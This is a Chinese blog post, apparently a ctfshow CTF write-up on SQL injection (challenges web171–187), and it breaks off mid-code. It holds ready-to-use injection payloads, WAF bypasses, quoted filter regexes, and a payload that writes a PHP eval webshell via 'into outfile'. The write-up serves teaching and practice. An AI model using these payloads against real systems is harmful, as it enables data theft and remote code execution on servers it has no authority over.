<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#FFF"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png"><link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="alternate" type="application/rss+xml" title="dpm12345" href="http://dpm12345.cn/rss.xml"><link rel="alternate" type="application/atom+xml" title="dpm12345" href="http://dpm12345.cn/atom.xml"><link rel="alternate" type="application/json" title="dpm12345" href="http://dpm12345.cn/feed.json"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="/css/app.css?v=0.2.5"><meta name="keywords" content="CTF,ctfshow"><link rel="canonical" href="http://dpm12345.cn/posts/35cb7ca5/"><title>SQL 注入 - Web 入门 - ctfshow - CTF | dpm12345-blog = dpm12345 = 路漫漫其修远兮</title><meta name="generator" content="Hexo 6.3.0"><style>.github-emoji{position:relative;display:inline-block;width:1.2em;min-height:1.2em;overflow:hidden;vertical-align:top;color:transparent}.github-emoji>span{position:relative;z-index:10}.github-emoji .fancybox,.github-emoji img{margin:0!important;padding:0!important;border:none!important;outline:0!important;text-decoration:none!important;user-select:none!important;cursor:auto!important}.github-emoji img{height:1.2em!important;width:1.2em!important;position:absolute!important;left:50%!important;top:50%!important;transform:translate(-50%,-50%)!important;user-select:none!important;cursor:auto!important}.github-emoji-fallback{color:inherit}.github-emoji-fallback img{opacity:0!important}</style></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">SQL 注入</h1><div class="meta"><span class="item" title="创建时间：2022-10-04 22:15:40"><span class="icon"><i class="ic i-calendar"></i> </span><span class="text">发表于</span> <time itemprop="dateCreated datePublished" datetime="2022-10-04T22:15:40+08:00">2022-10-04</time> </span><span class="item" title="本文字数"><span class="icon"><i class="ic i-pen"></i> </span><span class="text">本文字数</span> <span>11k</span> <span class="text">字</span> </span><span class="item" title="阅读时长"><span class="icon"><i class="ic i-clock"></i> </span><span class="text">阅读时长</span> <span>15 分钟</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span> <span class="line"></span> <span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">dpm12345-blog</a></li></ul><ul class="right"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div id="imgs" class="pjax"><ul><li class="item" data-background-image="https://pic.imgdb.cn/item/63c56a70be43e0d30e759d0d.jpg"></li><li class="item" data-background-image="https://pic.imgdb.cn/item/63c56b0bbe43e0d30e768d92.jpg"></li><li class="item" data-background-image="https://pic.imgdb.cn/item/63c56a0cbe43e0d30e75135b.jpg"></li><li class="item" data-background-image="https://pic.imgdb.cn/item/63c5684ebe43e0d30e70e042.jpg"></li><li class="item" data-background-image="https://pic.imgdb.cn/item/63c56a06be43e0d30e750bab.jpg"></li><li class="item" data-background-image="https://pic.imgdb.cn/item/63c568dfbe43e0d30e7282ca.png"></li></ul></div><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"/></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"/><use xlink:href="#gentle-wave" x="48" y="3"/><use xlink:href="#gentle-wave" x="48" y="5"/><use xlink:href="#gentle-wave" x="48" y="7"/></g></svg></div></header><main><div class="inner"><div id="main" class="pjax"><div class="article wrap"><div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i> <span><a href="/">首页</a></span><i class="ic i-angle-right"></i> <span itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/CTF/" itemprop="item" rel="index" title="分类于 CTF"><span itemprop="name">CTF</span></a><meta itemprop="position" content="1"></span><i class="ic i-angle-right"></i> <span itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/CTF/ctfshow/" itemprop="item" rel="index" title="分类于 ctfshow"><span itemprop="name">ctfshow</span></a><meta itemprop="position" content="2"></span><i class="ic i-angle-right"></i> <span class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/CTF/ctfshow/Web%E5%85%A5%E9%97%A8/" itemprop="item" rel="index" title="分类于 Web 入门"><span itemprop="name">Web 入门</span></a><meta itemprop="position" content="3"></span></div><article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="http://dpm12345.cn/posts/35cb7ca5/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/avatar.jpg"><meta itemprop="name" content="zhong"><meta itemprop="description" content="路漫漫其修远兮, 学习记录"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="dpm12345"></span><div class="body md" itemprop="articleBody"><ul><li><p>若对返回值进行过滤</p><ul><li><p>可以在该字段名前加上 <code>hex()</code> 十六进制编码</p></li><li><p>使用 replace 函数，对返回结果进行替换，绕过 waf，得到替换结果后再替换回来</p></li></ul></li><li><p>sql 注入也可以将内容写入到外部文件中，</p><p>如 <code>select "&lt;?php eval($_POST[1]);?&gt;" into outfile '/var/www/html/1.php'</code></p><p>为了防止失败，可对 php 语句进行编码 <code>(base64+url)</code></p><p>之后访问 1.php，可以发现成功，然后使用蚁剑连接，进行数据操作，然后新建数据库 (信息在根目录下 <code>api</code> 下的 <code>config.php</code> 文件中)</p><p>之后找到 flag</p></li><li><p>如果过滤 sql 语句中的某个值，如 <code>username=flag</code> ，而 flag 被过滤，那么可以使用 <code>like+通配符</code> 的方法，如 <code>like '%fla%'</code></p><p>其中 <code>%</code> 匹配任意个字符， <code>_</code> 匹配一个字符，同样也可以使用十六进制编码</p><p>如 <code>select id,username,password from users where username=0x666c6167;</code> 也是可以的，查询出 <code>username='flag'</code> 的情况</p><p>或者用 <code>base64</code> 编码</p></li><li><p>where 被过滤可以使用 having，同 where 用法</p></li><li><p>若 ban 了数字，那么可以使用 <code>true，false</code> 来代替 <code>1 和 0</code> ，然后利用加法构建任意数字，接着利用 <code>concat</code> 函数拼接字符串，从而生成无数字的语句的 (但实际上包含语句)，如</p><p><code>select username,password from users where id=concat(true,true);</code></p><p>等价于 <code>select username,password from users where id='11';</code></p></li><li><p>对于 select 的查询语句</p><p><code>select count(*) from users where username='8' or 'a23';</code></p><p>返回结果是 0</p><p><code>select count(*) from users where username='8' or '1a';</code></p><p>返回结果是数据条数</p><p><code>select count(*) from users where username='8' or '1';</code></p><p>返回结果是数据条数</p><p><code>select count(*) from users where username='8' or '0';</code></p><p>返回结果是 0</p><p>那么也就是说，在 or 语句中，0，字母开头的为非，数字开头的为正</p><p>可利用该特性进行 SQL 注入</p></li><li><p>sql 语句的查询机制</p></li><li><p>如 sql 语句 <code>select username,password from users where username='flag';</code></p><p>它将会返回 <code>username</code> 为 <code>flag</code> 的值的数据</p><p>但如果此时将 <code>username='flag'</code> 换为 <code>username=0</code> 后，是否还能查到 flag 呢？</p><p>答案是肯定的，这是因为，这里的等于是弱等于，</p></li><li><p>substr 如果被禁了，可以使用 left 代替，其中 left 只有两个参数，第一个为字符串，第二个为个数，即从最左端开始</p><p>如 <code>select left("abc",2);</code> 返回 <code>ab</code></p><p>或者也可以使用 <code>lpad</code> ，其有三个参数</p><figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tbody><tr><td data-num="1"></td><td><pre>LPAD<span class="token punctuation">(</span>str<span class="token punctuation">,</span>len<span class="token punctuation">,</span>padstr<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">Returns</span> the string str<span class="token punctuation">,</span> <span class="token keyword">left</span><span class="token operator">-</span>padded <span class="token keyword">with</span> the string padstr <span class="token keyword">to</span> a length <span class="token keyword">of</span> len characters<span class="token punctuation">.</span> <span class="token keyword">If</span> str <span class="token operator">is</span> longer than len<span class="token punctuation">,</span> the <span class="token keyword">return</span> <span class="token keyword">value</span> <span class="token operator">is</span> shortened <span class="token keyword">to</span> len characters<span class="token punctuation">.</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre>mysql<span class="token operator">&gt;</span> <span class="token keyword">SELECT</span> LPAD<span class="token punctuation">(</span><span class="token string">'hi'</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">'??'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token string">'??hi'</span></pre></td></tr><tr><td data-num="8"></td><td><pre>mysql<span class="token operator">&gt;</span> <span class="token keyword">SELECT</span> LPAD<span class="token punctuation">(</span><span class="token string">'hi'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'??'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>        <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token string">'h'</span></pre></td></tr></tbody></table></figure><p>那么可以 <code>lpad("abc",2,"");</code> 达到与 left 同样效果</p></li><li><p>时间盲注</p><p><strong>sleep(3)</strong> 直截了当的时间盲注</p><p><strong>benchmark()</strong></p><p>The BENCHMARK() function executes the expression expr repeatedly count times. It may be used to time how quickly MySQL processes the expression. The result value is 0, or NULL for inappropriate arguments such as a NULL or negative repeat count.</p><p><strong>rlike</strong> 正则匹配</p><p><strong>多次查询排序</strong></p><figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tbody><tr><td data-num="1"></td><td><pre>ip<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">and</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">&gt;</span><span class="token number">1</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">from</span> <span class="token punctuation">(</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">(</span><span class="token keyword">select</span> table_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token punctuation">(</span><span class="token keyword">select</span> table_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">(</span><span class="token keyword">select</span> table_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">limit</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">)</span>c<span class="token punctuation">)</span> <span class="token keyword">limit</span> <span class="token number">1</span></pre></td></tr></tbody></table></figure></li></ul><h1 id="web-171"><a class="anchor" href="#web-171">#</a> web 171</h1><p>根据查询语句</p><p><code>$sql = "select username,password from user where username !='flag' and id = '".$_GET['id']."' limit 1;";</code> 可知可用单引号闭合，然后利用 or 的特性</p><p><code>0' or username='flag'%23</code></p><p>查找到 flag</p><h1 id="web-172"><a class="anchor" href="#web-172">#</a> web 172</h1><p>使用联合注入</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tbody><tr><td data-num="1"></td><td><pre><span class="token comment">// 检查结果是否有 flag</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token operator">-&gt;</span><span class="token property">username</span><span class="token operator">!==</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">{</span></pre></td></tr><tr><td data-num="3"></td><td><pre>      <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'查询成功'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token punctuation">}</span></pre></td></tr></tbody></table></figure><p><code>' union select 1,password from ctfshow_user2 where username ='flag'%23</code></p><h1 id="web-173"><a class="anchor" href="#web-173">#</a> web 173</h1><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tbody><tr><td data-num="1"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag/i'</span><span class="token punctuation">,</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span></pre></td></tr><tr><td data-num="2"></td><td><pre>      <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'查询成功'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token punctuation">}</span></pre></td></tr></tbody></table></figure><p>同上题</p><p><code>' union select 1,2,password from ctfshow_user3 where username ='flag'%23</code></p><h1 id="web-174"><a class="anchor" href="#web-174">#</a> web 174</h1><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tbody><tr><td data-num="1"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag/i'</span><span class="token punctuation">,</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span></pre></td></tr><tr><td data-num="2"></td><td><pre>      <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'查询成功'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token punctuation">}</span></pre></td></tr></tbody></table></figure><p>这题使用 <code>replace</code> 函数对数字进行替换</p><p>注意需要抓包，因为内容过长，正常提交不上去，同时 url 编码</p><p><code>'%20union%20select%20'a'%2Creplace(replace(replace(replace(replace(replace(replace(replace(replace(replace((b.password)%2C'0'%2C'!')%2C'1'%2C'%23')%2C'2'%2C'%24')%2C'3'%2C'%25')%2C'4'%2C'%26')%2C'5'%2C'(')%2C'6'%2C')')%2C'7'%2C'*')%2C'8'%2C'%2B')%2C'9'%2C'%2C')%20from%20ctfshow_user4%20as%20b%20where%20b.username%3D'flag'%23</code></p><h1 id="web-175"><a class="anchor" href="#web-175">#</a> web 175</h1><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tbody><tr><td data-num="1"></td><td><pre><span class="token comment">// 检查结果是否有 flag</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[\x00-\x7f]/i'</span><span class="token punctuation">,</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span></pre></td></tr><tr><td data-num="3"></td><td><pre>      <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'查询成功'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token punctuation">}</span></pre></td></tr></tbody></table></figure><p>过滤了所有 ASCII 字符</p><p>写文件</p><p><code>'%20union%20select%201%2C%22%3C%3Fphp%20eval(%24_POST%5B1%5D)%3B%22%20into%20outfile%20%22%2Fvar%2Fwww%2Fhtml%2F1.php%22%23</code></p><p>然后蚁剑连接，进入数据库，查询 flag <code>select password from ctfshow_user5 where username='flag';</code></p><h1 id="web-176"><a class="anchor" href="#web-176">#</a> web 176</h1><p><code>0' or username='flag'%23</code></p><h1 id="web-177"><a class="anchor" href="#web-177">#</a> web 177</h1><p>过滤了空格</p><p><code>0'/**/or/**/username='flag'%23</code></p><h1 id="web-178"><a class="anchor" href="#web-178">#</a> web 178</h1><p>前面的空格绕过用不了，这里使用 <code>%0a</code> 和括号绕过</p><p><code>0'union%0aselect'1','2',(select(password)from(ctfshow_user)where(username='flag'))%23</code></p><p>或者仅仅用括号</p><p><code>0'or(username='flag')%23</code></p><h1 id="web-179"><a class="anchor" href="#web-179">#</a> web 179</h1><p>同上一题做法</p><h1 id="web-180"><a class="anchor" href="#web-180">#</a> web 180</h1><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tbody><tr><td data-num="1"></td><td><pre><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select id,username,password from ctfshow_user where username !='flag' and id = '"</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"' limit 1;"</span><span class="token punctuation">;</span></pre></td></tr></tbody></table></figure><h2 id="解法一"><a class="anchor" href="#解法一">#</a> 解法一</h2><p><code>0'union%0cselect'1','2',(select(password)from(ctfshow_user)where(username='flag'))'</code></p><p>由于过滤了 <code>--+</code> 和 <code>#</code> ，只能使用闭合</p><h2 id="解法二"><a class="anchor" href="#解法二">#</a> 解法二</h2><p><code>0'or(username='flag')and'2</code></p><p>原理是运用了 sql 语句的判断优先级，与原查询语句组合后，得到 <code>select id,username,password from ctfshow_user where username !='flag' and id = 0'or(username='flag')and'2' limit 1;</code></p><p><code>username!='flag' and id=0</code> 和 <code>username='flag' and '2'</code> 作为两个条件进行判断，因此可以返回结果</p><h1 id="web-181"><a class="anchor" href="#web-181">#</a> web 181</h1><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tbody><tr><td data-num="1"></td><td><pre><span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>  <span class="token punctuation">}</span></pre></td></tr></tbody></table></figure><p>用上一题的解法二即可</p><h1 id="web-182"><a class="anchor" href="#web-182">#</a> web 182</h1><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tbody><tr><td data-num="1"></td><td><pre><span class="token comment">// 对传入的参数进行了过滤</span></pre></td></tr><tr><td data-num="2"></td><td><pre>  <span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select|flag/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>  <span class="token punctuation">}</span></pre></td></tr></tbody></table></figure><p>过滤了 flag，前面的 <code>username='flag'</code> 用不了，这里可以使用正则 <code>0'or(username)regexp'f'and'2</code></p><p>或者根据前面做题，知 flag 始终在 id 为 26 的地方，故可以使用 <code>id=26</code> , 即 <code>0'or(id=26)and'2</code></p><h1 id="web-183"><a class="anchor" href="#web-183">#</a> web 183</h1><p>``</p><h1 id="web-184"><a class="anchor" href="#web-184">#</a> web 184</h1><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tbody><tr><td data-num="1"></td><td><pre><span class="token comment">// 查询语句</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">// 拼接 sql 语句查找指定 ID 用户</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select count(*) from "</span><span class="token operator">.</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tableName'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">";"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token comment">// 返回逻辑</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into|where|\x26|\'|\"|union|\`|sleep|benchmark/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>  <span class="token punctuation">}</span></pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token comment">// 查询结果</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token comment">// 返回用户表的记录总数</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token variable">$user_count</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr></tbody></table></figure><h1 id="web-185"><a class="anchor" href="#web-185">#</a> web 185</h1><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tbody><tr><td data-num="1"></td><td><pre><span class="token comment">// 拼接 sql 语句查找指定 ID 用户</span></pre></td></tr><tr><td data-num="2"></td><td><pre>  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select count(*) from "</span><span class="token operator">.</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tableName'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">";"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token comment">// 对传入的参数进行了过滤</span></pre></td></tr><tr><td data-num="5"></td><td><pre>  <span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\'|\"|union|\`|sleep|benchmark/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>  <span class="token punctuation">}</span></pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre>      </pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token comment">// 返回用户表的记录总数</span></pre></td></tr><tr><td data-num="12"></td><td><pre>      <span class="token variable">$user_count</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr></tbody></table></figure><p>可以看到，相比上题，这题多过滤了数字，如果要用之前的十六进制，分别需要获取数字 0-9 和字母 x，A,B,C,D,E,F</p><p>对于数字，在 SQL 中可以利用以下来获取</p><pre><code class="language-mysql">true 1
false 0
select true;   --&gt;    1
select false;   --&gt;    0
slect true+true; --&gt;    2

//同时也可以利用ceil，floor来获取如pi(),version()中的数据
select pi();    --&gt; 3.141593
select floor(pi());   --&gt; 3
select ceil(pi());    --&gt; 4
</code></pre><p>这里已经想到办法获得数字了，下面是字母的获取，这里可以使用 char</p><pre><code class="language-mysql">select char(97);  --&gt;  'a'
</code></pre><p>于是字母数字均获得，下面是两种思路</p><ol><li>利用 substr/left/right 函数，截取字符串，其截取位置和长度可由 <code>true</code> 来生成，然后使用前面一样的 regexp 进行匹配，其中一种是使用 concat 和 char 连接字符串，一种是只截取一位然后一位一位匹配</li><li>利用 UNHEX 和 concat 函数，其中 concat 用来连接字母数字成十六进制字符串，UNHEX 用来对十六进制进行解码</li></ol><p>下面针对第一个编写脚本</p><pre><code class="language-python"></code></pre><h1 id="web-186"><a class="anchor" href="#web-186">#</a> web 186</h1><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tbody><tr><td data-num="1"></td><td><pre><span class="token comment">// 拼接 sql 语句查找指定 ID 用户</span></pre></td></tr><tr><td data-num="2"></td><td><pre>  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select count(*) from "</span><span class="token operator">.</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tableName'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">";"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token comment">// 对传入的参数进行了过滤</span></pre></td></tr><tr><td data-num="5"></td><td><pre>  <span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\%|\&lt;|\&gt;|\^|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\'|\"|union|\`|sleep|benchmark/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>  <span class="token punctuation">}</span></pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre>      </pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token comment">// 返回用户表的记录总数</span></pre></td></tr><tr><td data-num="12"></td><td><pre>      <span class="token variable">$user_count</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr></tbody></table></figure><p>相比之前过滤了 <code>%&lt;&gt;^</code> ，无影响，继续使用上题脚本</p><h1 id="web-187"><a class="anchor" href="#web-187">#</a> web 187</h1><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tbody><tr><td data-num="1"></td><td><pre><span class="token comment">// 拼接 sql 语句查找指定 ID 用户</span></pre></td></tr><tr><td data-num="2"></td><td><pre>  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select count(*) from ctfshow_user where username = '<span class="token interpolation"><span class="token variable">$username</span></span>' and password= '<span class="token interpolation"><span class="token variable">$password</span></span>'"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span 